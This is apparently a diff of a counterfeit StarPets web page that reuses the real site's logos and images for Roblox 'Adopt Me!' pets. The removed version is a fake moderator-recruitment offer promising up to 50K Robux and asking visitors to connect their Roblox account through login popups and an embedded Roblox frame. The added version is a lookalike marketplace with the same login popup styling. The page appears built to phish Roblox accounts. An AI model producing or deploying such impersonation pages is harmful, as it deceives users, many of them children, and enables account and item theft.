@@ -9,1367 +9,578 @@
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
 <link rel="manifest" href="/site.webmanifest">
-<title>StarPets - Staff</title>
+  <title>StarPets</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Nunito', sans-serif; background: #f2f3f7; overflow-x: hidden; }
 
-<style>
+    /* HEADER */
+    header {
+      width: 100%; background: #fff; border-bottom: 1.5px solid #f0f0f0;
+      height: 62px; display: flex; align-items: center; padding: 0 28px;
+      justify-content: space-between; position: sticky; top: 0; z-index: 100;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.05);
+    }
+    .header-logo a { display: flex; align-items: center; }
+    .header-logo img { height: 34px; }
+    .header-nav { display: flex; align-items: center; gap: 2px; }
+    .header-nav a {
+      text-decoration: none; color: #c0c0c0; font-size: 14px; font-weight: 700;
+      padding: 6px 14px; border-radius: 10px; letter-spacing: 0.01em; white-space: nowrap;
+    }
+    .header-nav a.market { color: #555; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+    .btn-plus {
+      background: #FF6B00; color: #fff; border: none; border-radius: 10px;
+      padding: 7px 18px; font-size: 20px; font-weight: 800; line-height: 1;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+    }
+    .user-area {
+      display: flex; align-items: center; gap: 5px;
+      cursor: pointer; padding: 4px 8px; border-radius: 10px;
+    }
+    .user-area img { height: 30px; width: 30px; border-radius: 50%; object-fit: cover; }
+    .chevron-down { width: 16px; height: 16px; color: #999; flex-shrink: 0; }
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-html{
-    scroll-behavior:smooth;
-}
-
-body{
-    font-family:Inter,Arial,sans-serif;
-    background:#f3f3f3;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:flex-start;
-    padding:18px;
-    overflow-x:hidden;
-    color:#222;
-}
-
-/* MAIN */
-
-.mainCard{
-    width:100%;
-    max-width:430px;
-    background:white;
-    border-radius:30px;
-    overflow:hidden;
-    border:1px solid #ebebeb;
-    box-shadow:
-    0 15px 50px rgba(0,0,0,0.08),
-    0 3px 10px rgba(0,0,0,0.04);
-    animation:cardAppear .6s ease;
-}
-
-@keyframes cardAppear{
-
-    from{
-        transform:translateY(25px);
-        opacity:0;
+    /* MAIN LAYOUT — panel izquierda, banner derecha */
+    .page-body { max-width: 100%; box-sizing: border-box;
+      display: flex;
+      gap: 20px;
+      padding: 24px 28px;
+      align-items: flex-start;
     }
 
-    to{
-        transform:translateY(0);
-        opacity:1;
+    /* BANNER */
+    .banner-wrap {  min-width: 0; }
+    .banner-img { width: 100%; height: 200px; border-radius: 20px; background: url('https://starpets.gg/_nuxt/5hx6sv4jrA-5415f33b.png') center/cover no-repeat; }
+    .banner img { width: 100%; height: auto; max-height: 180px; object-fit: contain; display: block; border-radius: 20px; background: #000; }
+
+    /* SIDE PANEL */
+    .side-panel {
+      width: 220px;
+      flex-shrink: 0;
+      background: #fff;
+      border-radius: 18px;
+      padding: 18px 16px 28px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      min-height: 460px;
     }
 
-}
-
-/* HEADER */
-
-.header{
-    background:
-    linear-gradient(180deg,#ffab45 0%,#ff9622 100%);
-    padding:28px 22px 34px;
-    position:relative;
-    overflow:hidden;
-}
-
-.header::before{
-    content:"";
-    position:absolute;
-    width:240px;
-    height:240px;
-    border-radius:999px;
-    background:rgba(255,255,255,0.12);
-    right:-120px;
-    top:-120px;
-}
-
-.logo{
-    width:145px;
-    margin-bottom:24px;
-    position:relative;
-    z-index:2;
-}
-
-.badge{
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    background:rgba(255,255,255,0.18);
-    border:1px solid rgba(255,255,255,0.24);
-    padding:8px 14px;
-    border-radius:999px;
-    color:white;
-    font-size:13px;
-    font-weight:700;
-    backdrop-filter:blur(10px);
-    margin-bottom:18px;
-    position:relative;
-    z-index:2;
-}
-
-.title{
-    color:white;
-    font-size:33px;
-    line-height:1.05;
-    font-weight:900;
-    letter-spacing:-1.2px;
-    margin-bottom:16px;
-    position:relative;
-    z-index:2;
-}
-
-.subtitle{
-    color:rgba(255,255,255,0.92);
-    line-height:1.6;
-    font-size:15px;
-    font-weight:500;
-    position:relative;
-    z-index:2;
-}
-
-/* CONTENT */
-
-.content{
-    padding:24px 22px 28px;
-}
-
-.gameCard{
-    background:#fafafa;
-    border:1px solid #ececec;
-    border-radius:22px;
-    padding:14px;
-    display:flex;
-    align-items:center;
-    gap:14px;
-    margin-bottom:20px;
-    animation:fadeUp .7s ease;
-}
-
-.gameIcon{
-    width:66px;
-    height:66px;
-    border-radius:18px;
-    object-fit:cover;
-    background:white;
-    padding:5px;
-}
-
-.gameLabel{
-    color:#a0a0a0;
-    font-size:13px;
-    margin-bottom:5px;
-}
-
-.gameName{
-    font-size:19px;
-    font-weight:800;
-}
-
-.sectionTitle{
-    font-size:17px;
-    font-weight:800;
-    margin-bottom:14px;
-    color:#1f1f1f;
-}
-
-/* PET LOOP */
-
-.petSlider{
-    width:100%;
-    overflow:hidden;
-    position:relative;
-    margin-bottom:22px;
-}
-
-.petSlider::before,
-.petSlider::after{
-    content:"";
-    position:absolute;
-    top:0;
-    width:45px;
-    height:100%;
-    z-index:5;
-    pointer-events:none;
-}
-
-.petSlider::before{
-    left:0;
-    background:linear-gradient(to right,#fff,transparent);
-}
-
-.petSlider::after{
-    right:0;
-    background:linear-gradient(to left,#fff,transparent);
-}
-
-.petTrack{
-    display:flex;
-    width:max-content;
-    gap:14px;
-    animation:petLoop 26s linear infinite;
-}
-
-.petSlider:hover .petTrack{
-    animation-play-state:paused;
-}
-
-@keyframes petLoop{
-
-    0%{
-        transform:translateX(0);
+    .game-label {
+      font-size: 10px; font-weight: 800; color: #bbb;
+      text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px;
     }
 
-    100%{
-        transform:translateX(-50%);
+    .game-frame {
+      display: flex; align-items: center; gap: 10px;
+      background: #f7f8fa; border-radius: 12px; padding: 8px 10px;
+      margin-bottom: 18px; border: 1.5px solid #eee;
+    }
+    .game-frame img { width: 38px; height: 38px; border-radius: 8px; object-fit: cover; }
+    .game-frame-info { display: flex; flex-direction: column; gap: 2px; }
+    .game-name { font-size: 13px; font-weight: 800; color: #333; }
+
+    .rarity-row {
+      display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;
+    }
+    .rarity-title { font-size: 13px; font-weight: 700; color: #444; }
+    .rarity-arrow { width: 18px; height: 18px; color: #bbb; }
+
+    /* squares */
+    .rarity-squares { display: flex; gap: 5px; margin-bottom: 14px; }
+    .sq {  height: 28px; border-radius: 7px; position: relative; overflow: hidden; }
+    .sq::before, .sq::after { content: ''; position: absolute; left: 0; right: 0; height: 50%; }
+    .sq::before { top: 0; }
+    .sq::after  { bottom: 0; }
+    .sq-gray::before   { background: #d0d0d0; } .sq-gray::after   { background: #888; }
+    .sq-green::before  { background: #7de89a; } .sq-green::after  { background: #1fa84a; }
+    .sq-blue::before   { background: #7ac4f7; } .sq-blue::after   { background: #1a7fd4; }
+    .sq-purple::before { background: #c9a8f7; } .sq-purple::after { background: #7c3fdb; }
+    .sq-orange::before { background: #ffba72; } .sq-orange::after { background: #e06200; }
+
+    /* rarities vertical */
+    .rarities-label {
+      font-size: 10px; font-weight: 800; color: #ccc;
+      text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 10px;
     }
 
-}
+    .rarity-circles { display: flex; flex-direction: column; gap: 8px; }
 
-.petCard{
-    width:122px;
-    background:#fafafa;
-    border:1px solid #ececec;
-    border-radius:20px;
-    overflow:hidden;
-    flex-shrink:0;
-    transition:0.25s;
-}
-
-.petCard:hover{
-    transform:translateY(-5px);
-}
-
-.petImage{
-    width:100%;
-    height:112px;
-    object-fit:cover;
-    background:#f3f3f3;
-}
-
-.petName{
-    padding:12px;
-    text-align:center;
-    font-size:13px;
-    font-weight:800;
-}
-
-/* CONNECT BTN */
-
-.connectBtn{
-    width:100%;
-    height:60px;
-    border-radius:18px;
-    background:#fafafa;
-    border:1px solid #ececec;
-    display:flex;
-    align-items:center;
-    padding:0 18px;
-    gap:14px;
-    cursor:pointer;
-    transition:0.22s;
-}
-
-.connectBtn:hover{
-    background:#f5f5f5;
-    transform:translateY(-2px);
-}
-
-.connectBtn:active{
-    transform:scale(.98);
-}
-
-.plus{
-    width:24px;
-    height:24px;
-    position:relative;
-}
-
-.plus::before,
-.plus::after{
-    content:"";
-    position:absolute;
-    background:#ff9729;
-    border-radius:99px;
-}
-
-.plus::before{
-    width:24px;
-    height:4px;
-    top:10px;
-    left:0;
-}
-
-.plus::after{
-    width:4px;
-    height:24px;
-    left:10px;
-    top:0;
-}
-
-.btnText{
-    font-size:16px;
-    font-weight:600;
-}
-
-/* REWARD */
-
-.rewardBox{
-    margin-top:22px;
-    background:#fafafa;
-    border:1px solid #ececec;
-    border-radius:26px;
-    padding:18px;
-    display:flex;
-    gap:18px;
-    align-items:center;
-    position:relative;
-    overflow:hidden;
-    animation:fadeUp .9s ease;
-}
-
-.rewardGlow{
-    position:absolute;
-    width:180px;
-    height:180px;
-    background:radial-gradient(circle,rgba(255,255,255,.9),transparent 70%);
-    left:-30px;
-    top:-20px;
-}
-
-.rewardImage{
-    width:120px;
-    position:relative;
-    z-index:2;
-}
-
-.rewardTitle{
-    color:#2b8fff;
-    font-size:18px;
-    font-weight:900;
-    line-height:1.2;
-    margin-bottom:8px;
-}
-
-.rewardText{
-    color:#777;
-    line-height:1.5;
-    font-size:13px;
-    margin-bottom:14px;
-}
-
-.paymentMethods{
-    display:flex;
-    gap:10px;
-}
-
-.paymentItem{
-    background:white;
-    border:1px solid #ececec;
-    border-radius:16px;
-    padding:10px 12px;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    min-width:88px;
-    transition:0.22s;
-}
-
-.paymentItem:hover{
-    transform:translateY(-3px);
-}
-
-.paymentIcon{
-    width:34px;
-    height:34px;
-    object-fit:contain;
-    margin-bottom:8px;
-}
-
-.paymentName{
-    font-size:12px;
-    font-weight:800;
-}
-
-/* POPUPS */
-
-.popupOverlay{
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.5);
-    backdrop-filter:blur(6px);
-    display:none;
-    justify-content:center;
-    align-items:center;
-    padding:18px;
-    z-index:9999;
-}
-
-.popup{
-    width:100%;
-    max-width:430px;
-    background:white;
-    border-radius:32px;
-    padding:26px;
-    position:relative;
-    display:none;
-    animation:popupShow .22s ease;
-}
-
-@keyframes popupShow{
-
-    from{
-        transform:scale(.95) translateY(12px);
-        opacity:0;
+    .rc-row {
+      display: flex; align-items: center; gap: 10px;
     }
 
-    to{
-        transform:scale(1) translateY(0);
-        opacity:1;
+    .rc {
+      width: 32px; height: 32px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 800; color: #fff; flex-shrink: 0;
+    }
+    .rc-blue   { background: #1a7fd4; }
+    .rc-red    { background: #e03c3c; }
+    .rc-green  { background: #1fa84a; }
+    .rc-purple { background: #7c3fdb; }
+    .rc-label { font-size: 13px; font-weight: 700; color: #444;  }
+    .rc-sq { width: 24px; height: 24px; border-radius: 5px; position: relative; overflow: hidden; flex-shrink: 0; }
+    .rc-sq::before, .rc-sq::after { content: ""; position: absolute; left: 0; right: 0; height: 50%; }
+    .rc-sq::before { top: 0; } .rc-sq::after { bottom: 0; }
+
+    .items-row {
+      display: flex;
+      gap: 14px;
+      margin-top: 16px;
+      flex-wrap: wrap;
+    }
+    .item-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      width: 130px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+    }
+    .item-card img {
+      width: 80px;
+      height: 80px;
+      object-fit: contain;
+    }
+    .item-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: #222;
+      text-align: center;
+    }
+    .item-price {
+      font-size: 13px;
+      font-weight: 700;
+      color: #222;
     }
 
-}
-
-.stepBadge{
-    position:absolute;
-    top:18px;
-    right:18px;
-    background:#dff2ff;
-    color:#2b8fff;
-    border:1px solid #bfe6ff;
-    font-size:12px;
-    font-weight:800;
-    padding:8px 13px;
-    border-radius:999px;
-}
-
-.popupImage{
-    width:360px;
-    max-width:100%;
-    display:block;
-    margin:0 auto 22px;
-}
-
-.popupMiniLabel{
-    width:max-content;
-    margin:0 auto 14px;
-    background:#dff2ff;
-    color:#2b8fff;
-    border:1px solid #bfe6ff;
-    padding:9px 16px;
-    border-radius:999px;
-    font-size:13px;
-    font-weight:800;
-}
-
-.popupTitle{
-    text-align:center;
-    font-size:29px;
-    line-height:1.08;
-    font-weight:900;
-    margin-bottom:12px;
-}
-
-.popupText{
-    text-align:center;
-    color:#777;
-    line-height:1.6;
-    font-size:15px;
-    margin-bottom:24px;
-}
-
-.popupBtn{
-    width:100%;
-    height:60px;
-    border:none;
-    border-radius:18px;
-    background:#ff9225;
-    color:white;
-    font-size:16px;
-    font-weight:800;
-    cursor:pointer;
-    transition:.2s;
-}
-
-.popupBtn:hover{
-    transform:translateY(-2px);
-}
-
-.loginMethod{
-    background:#fafafa;
-    border:1px solid #ececec;
-    border-radius:22px;
-    padding:18px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    cursor:pointer;
-    transition:.2s;
-}
-
-.loginMethod:hover{
-    transform:translateY(-2px);
-}
-
-.loginLeft{
-    display:flex;
-    align-items:center;
-    gap:14px;
-}
-
-.loginIconWrap{
-    width:62px;
-    height:62px;
-    background:white;
-    border-radius:18px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border:1px solid #ececec;
-}
-
-.loginIcon{
-    width:38px;
-    height:38px;
-}
-
-.loginTitle{
-    font-size:17px;
-    font-weight:800;
-    margin-bottom:4px;
-}
-
-.loginSub{
-    font-size:13px;
-    color:#888;
-}
-
-.loginArrow{
-    font-size:26px;
-    color:#ff9225;
-}
-
-.warningBox{
-    margin-top:18px;
-    background:#fff8ef;
-    border:1px solid #ffe0b3;
-    color:#8a6632;
-    padding:14px;
-    border-radius:16px;
-    font-size:13px;
-    line-height:1.5;
-}
-
-/* ROBLOX MODAL */
-
-.robloxModal{
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.55);
-    backdrop-filter:blur(6px);
-    z-index:99999;
-    display:none;
-    justify-content:center;
-    align-items:center;
-    padding:16px;
-}
-
-.robloxContainer{
-    width:100%;
-    max-width:460px;
-    height:85vh;
-    background:white;
-    border-radius:28px;
-    overflow:hidden;
-    animation:popupShow .22s ease;
-}
-
-.robloxFrame{
-    width:100%;
-    height:100%;
-    border:none;
-}
-
-/* ANIM */
-
-@keyframes fadeUp{
-
-    from{
-        transform:translateY(18px);
-        opacity:0;
+    .search-bar-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .search-input {
+      
+      
+      height: 38px;
+      border: 1.5px solid #e8e8e8;
+      border-radius: 10px;
+      padding: 0 14px;
+      font-size: 13px;
+      font-family: 'Nunito', sans-serif;
+      color: #aaa;
+      outline: none;
+      background: #fff;
+    }
+    .filter-btn {
+      height: 38px;
+      padding: 0 16px;
+      border: 1.5px solid #e8e8e8;
+      border-radius: 10px;
+      background: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      color: #555;
+      cursor: pointer;
+      font-family: 'Nunito', sans-serif;
+    }
+    .popup-overlay.show { display: flex; }
+      to   { transform: scale(1);    opacity: 1; }
+    }
+    .popup-value span { color: #FF6B00; }
+    .popup-claim {
+      background: #FF6B00;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 12px 40px;
+      font-size: 15px;
+      font-weight: 800;
+      font-family: 'Nunito', sans-serif;
+      cursor: pointer;
+      margin-top: 4px;
     }
 
-    to{
-        transform:translateY(0);
-        opacity:1;
+    /* ── POPUP SYSTEM ── */
+    @keyframes popupShow {
+      from { transform: scale(.95) translateY(12px); opacity: 0; }
+      to   { transform: scale(1)   translateY(0);    opacity: 1; }
     }
-
-}
-
-@media(max-width:480px){
-
-    body{
-        padding:10px;
+    .popupOverlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.52);
+      backdrop-filter: blur(6px);
+      display: none; justify-content: center; align-items: center;
+      padding: 18px; z-index: 9999;
     }
-
-    .title{
-        font-size:28px;
+    .popupOverlay.active { display: flex !important; }
+    .popup {
+      width: 100%; max-width: 400px;
+      background: white; border-radius: 32px;
+      padding: 26px; position: relative;
+      display: none; animation: popupShow .22s ease;
+      font-family: Inter, Arial, sans-serif;
     }
-
-    .rewardBox{
-        flex-direction:column;
-        text-align:center;
+    .popup.active { display: block !important; }
+    .popupImage {
+      width: 200px; max-width: 100%;
+      display: block; margin: 0 auto 18px;
     }
-
-    .paymentMethods{
-        justify-content:center;
+    .popupMiniLabel {
+      width: max-content; margin: 0 auto 12px;
+      background: #dff2ff; color: #2b8fff;
+      border: 1px solid #bfe6ff;
+      padding: 8px 16px; border-radius: 999px;
+      font-size: 13px; font-weight: 800;
     }
-
-}
-
-</style>
+    .popupTitle {
+      text-align: center; font-size: 24px;
+      line-height: 1.1; font-weight: 900; margin-bottom: 10px; color: #1f1f1f;
+    }
+    .popupText {
+      text-align: center; color: #777;
+      line-height: 1.6; font-size: 14px; margin-bottom: 22px;
+    }
+    .popupBtn {
+      width: 100%; height: 56px; border: none;
+      border-radius: 16px; background: #ff9225;
+      color: white; font-size: 16px; font-weight: 800;
+      cursor: pointer; transition: .2s;
+      font-family: Inter, Arial, sans-serif;
+    }
+    .popupBtn:hover { transform: translateY(-2px); }
+    .loginMethod {
+      background: #fafafa; border: 1px solid #ececec;
+      border-radius: 22px; padding: 18px;
+      display: flex; align-items: center;
+      justify-content: space-between;
+      cursor: pointer; transition: .2s; margin-bottom: 14px;
+    }
+    .loginMethod:hover { transform: translateY(-2px); }
+    .loginLeft { display: flex; align-items: center; gap: 14px; }
+    .loginIconWrap {
+      width: 56px; height: 56px; background: white;
+      border-radius: 16px; display: flex; align-items: center;
+      justify-content: center; border: 1px solid #ececec;
+    }
+    .loginIconWrap img { width: 34px; height: 34px; }
+    .loginTitle { font-size: 16px; font-weight: 800; margin-bottom: 3px; color: #1f1f1f; }
+    .loginSub   { font-size: 12px; color: #999; }
+    .loginArrow { font-size: 24px; color: #ff9225; }
+    .warningBox {
+      background: #fff8ef; border: 1px solid #ffe0b3;
+      color: #8a6632; padding: 14px; border-radius: 14px;
+      font-size: 13px; line-height: 1.5;
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="mainCard">
+<!-- HEADER -->
+<header>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div class="header-logo">
+      <a href="https://starpets.gg">
+        <img src="https://starpets.gg/_nuxt/DbCEddln0H-5415f33b.svg" alt="StarPets" />
+      </a>
+    </div>
+    <nav class="header-nav">
+      <a href="https://starpets.gg/adopt-me/" class="market">Market</a>
+      <a href="https://starpets.gg/adopt-me/profile/purchased">Items</a>
+      <a href="https://starpets.gg/adopt-me/profile/trade/connected">Sale</a>
+      <a href="https://starpets.gg/rbx">R$</a>
+      <a href="https://starpets.gg/adopt-me/help">Help</a>
+    </nav>
+  </div>
+  <div class="header-right">
+    <button class="btn-plus">+</button>
+    <div class="user-area">
+      <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" alt="Usuario" />
+      <svg class="chevron-down" viewBox="0 0 16 16" fill="none">
+        <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+</header>
 
-    <!-- HEADER -->
+<!-- BODY -->
+<div class="page-body">
 
-    <div class="header">
+  <!-- Panel IZQUIERDA -->
+  <div class="side-panel">
+    <div class="game-label">Selected Game</div>
 
-        <img
-        class="logo"
-        src="https://starpets.gg/_nuxt/DbCEddln0H-5415f33b.svg"
-        alt=""
-        >
-
-        <div class="badge">
-            ⭐ Moderator Recruitment Open
-        </div>
-
-        <div class="title">
-            Become a StarPets Moderator Now!
-        </div>
-
-        <div class="subtitle">
-            We officially opened our Moderator applications.
-            Connect your Roblox account to continue.
-        </div>
-
+    <div class="game-frame">
+      <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" alt="Adopt Me" />
+      <div class="game-frame-info">
+        <span class="game-name">Adopt Me!</span>
+      </div>
     </div>
 
-    <!-- CONTENT -->
-
-    <div class="content">
-
-        <div class="gameCard">
-
-            <img
-            class="gameIcon"
-            src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg"
-            alt=""
-            >
-
-            <div>
-
-                <div class="gameLabel">
-                    Game
-                </div>
-
-                <div class="gameName">
-                    Adopt Me!
-                </div>
-
-            </div>
-
-        </div>
-
-        <div class="sectionTitle">
-            Some pets you will get!
-        </div>
-
-        <!-- PET LOOP -->
-
-        <div class="petSlider">
-
-            <div class="petTrack">
-
-                <!-- SET 1 -->
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/shadow_dragon_145223320826250720186133074893373364978.webp">
-                    <div class="petName">Shadow Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/frost_dragon_288374801322567532732771106755523238591.webp">
-                    <div class="petName">Frost Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/bat_dragon_146462647561927032198913846494863876793.webp">
-                    <div class="petName">Bat Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/parrot_276752226542783887148946785468163117051.webp">
-                    <div class="petName">Parrot</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/giraffe_241345040581239693008299843849746260574.webp">
-                    <div class="petName">Giraffe</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/lures_2023_blazing_lion_42148974014549937326294968256751041216.webp">
-                    <div class="petName">Blazing Lion</div>
-                </div>
-
-                <!-- DUPLICATE FOR PERFECT LOOP -->
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/shadow_dragon_145223320826250720186133074893373364978.webp">
-                    <div class="petName">Shadow Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/frost_dragon_288374801322567532732771106755523238591.webp">
-                    <div class="petName">Frost Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/bat_dragon_146462647561927032198913846494863876793.webp">
-                    <div class="petName">Bat Dragon</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/parrot_276752226542783887148946785468163117051.webp">
-                    <div class="petName">Parrot</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/giraffe_241345040581239693008299843849746260574.webp">
-                    <div class="petName">Giraffe</div>
-                </div>
-
-                <div class="petCard">
-                    <img class="petImage" src="https://cdn.starpets.gg/AM/610x610/lures_2023_blazing_lion_42148974014549937326294968256751041216.webp">
-                    <div class="petName">Blazing Lion</div>
-                </div>
-
-            </div>
-
-        </div>
-
-        <!-- BUTTON -->
-
-        <button class="connectBtn" onclick="openPopup()">
-
-            <div class="plus"></div>
-
-            <div class="btnText">
-                Add Account
-            </div>
-
-        </button>
-
-        <!-- IS IT SAFE -->
-
-        <button onclick="openSafetyPopup()" style="
-            width: 100%;
-            margin-top: 12px;
-            padding: 14px 0;
-            background: #ff9622;
-            color: white;
-            border: none;
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 700;
-            font-family: Inter, Arial, sans-serif;
-            cursor: pointer;
-            transition: 0.2s;
-        " onmouseover="this.style.background='#f08810'" onmouseout="this.style.background='#ff9622'" onmousedown="this.style.transform='scale(.98)'" onmouseup="this.style.transform=''">
-            Is it safe?
-        </button>
-
-        <!-- REWARD -->
-
-        <div class="rewardBox">
-
-            <div class="rewardGlow"></div>
-
-            <img
-            class="rewardImage"
-            src="https://starpets.gg/_nuxt/iPD6uhYSLI-5415f33b.png"
-            alt=""
-            >
-
-            <div>
-
-                <div class="rewardTitle">
-                    Some StarPets moderators earn up to 50K Robux a month!
-                </div>
-
-                <div class="rewardText">
-                    We pay our moderators as a thank you
-                    for helping and protecting the community.
-                </div>
-
-                <div class="paymentMethods">
-
-                    <div class="paymentItem">
-
-                        <img
-                        class="paymentIcon"
-                        src="https://starpets.gg/_nuxt/DTJToEANh0-5415f33b.png"
-                        alt=""
-                        >
-
-                        <div class="paymentName">
-                            Robux
-                        </div>
-
-                    </div>
-
-                    <div class="paymentItem">
-
-                        <img
-                        class="paymentIcon"
-                        src="https://starpets.gg/_nuxt/JRsjU2sDNn-5415f33b.png"
-                        alt=""
-                        >
-
-                        <div class="paymentName">
-                            Adopt Me Pets
-                        </div>
-
-                    </div>
-
-                </div>
-
-            </div>
-
-        </div>
-
+    <div class="rarity-row">
+      <span class="rarity-title">Rarity</span>
+      <svg class="rarity-arrow" viewBox="0 0 18 18" fill="none">
+        <path d="M4 7L9 12L14 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
     </div>
+
+    <div class="rarity-squares">
+      <div class="sq sq-gray"></div>
+      <div class="sq sq-green"></div>
+      <div class="sq sq-blue"></div>
+      <div class="sq sq-purple"></div>
+      <div class="sq sq-orange"></div>
+    </div>
+
+    <div class="rarities-label">Rarities</div>
+
+    <div class="rarity-circles">
+      <div class="rc-row"><div class="rc rc-blue">R</div><span class="rc-label">Ride</span><div class="rc-sq sq-gray"></div></div>
+      <div class="rc-row"><div class="rc rc-red">F</div><span class="rc-label">Fly</span><div class="rc-sq sq-green"></div></div>
+      <div class="rc-row"><div class="rc rc-green">N</div><span class="rc-label">Neon</span><div class="rc-sq sq-blue"></div></div>
+      <div class="rc-row"><div class="rc rc-purple">M</div><span class="rc-label">Mega</span><div class="rc-sq sq-orange"></div></div>
+    </div>
+  </div>
+
+  <!-- Banner DERECHA -->
+  <div class="banner-wrap">
+    <div class="banner-img"></div>
+    <div class="search-bar-row" style="margin-top: 24px;">
+      <input class="search-input" type="text" placeholder="Search..." />
+      <button class="filter-btn">Pets</button>
+      <button class="filter-btn">Egg</button>
+      <button class="filter-btn">Potion</button>
+    </div>
+    <div class="items-row">
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/pet_riding_potion_101493461815173759378365169605507115471.webp" alt="Ride Potion" />
+        <span class="item-name">Ride Potion</span>
+        <span class="item-price">$0.47</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/mochi_meow_1774255919623.webp" alt="Mochi Meow" />
+        <span class="item-name">Mochi Meow</span>
+        <span class="item-price">$0.34</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/pet_flying_potion_151613008033537193374293228043393845092.webp" alt="Ride Potion" />
+        <span class="item-name">Ride Potion</span>
+        <span class="item-price">$0.54</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/unicorn_55574302648181970936639571027851354135.webp" alt="Unicorn" />
+        <span class="item-name">Unicorn</span>
+        <span class="item-price">$0.20</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/610x610/shadow_dragon_ducky_1779384881686.webp" alt="Shadow Dragon Ducky" />
+        <span class="item-name">Shadow Dragon Ducky</span>
+        <span class="item-price">$0.50</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/610x610/dango_penguins_1762533667915.webp" alt="Dango Penguins" />
+        <span class="item-name">Dango Penguins</span>
+        <span class="item-price">$1.00</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/610x610/winter_2022_strawberry_shortcake_bat_dragon_100398837500437336282300853858882895706.webp" alt="Strawberry Bat Dragon" />
+        <span class="item-name">Strawberry Bat Dragon</span>
+        <span class="item-price">$12.00</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/fossil_egg_97982422838983668942474747691620426785.webp" alt="Fossil Egg" />
+        <span class="item-name">Fossil Egg</span>
+        <span class="item-price">$0.25</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/desert_2024_egg_301846729183568650751489237330413851855.webp" alt="Dessert Egg" />
+        <span class="item-name">Dessert Egg</span>
+        <span class="item-price">$0.40</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/ocean_egg_287407915015439907308808352431620931749.webp" alt="Ocean Egg" />
+        <span class="item-name">Ocean Egg</span>
+        <span class="item-price">$0.60</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/aussie_egg_209814524125579244726058063769126338395.webp" alt="Aussie Egg" />
+        <span class="item-name">Aussie Egg</span>
+        <span class="item-price">$0.80</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/kangaroo_256601391990744684971371644452415126665.webp" alt="Kangaroo" />
+        <span class="item-name">Kangaroo</span>
+        <span class="item-price">$6.00</span>
+      </div>
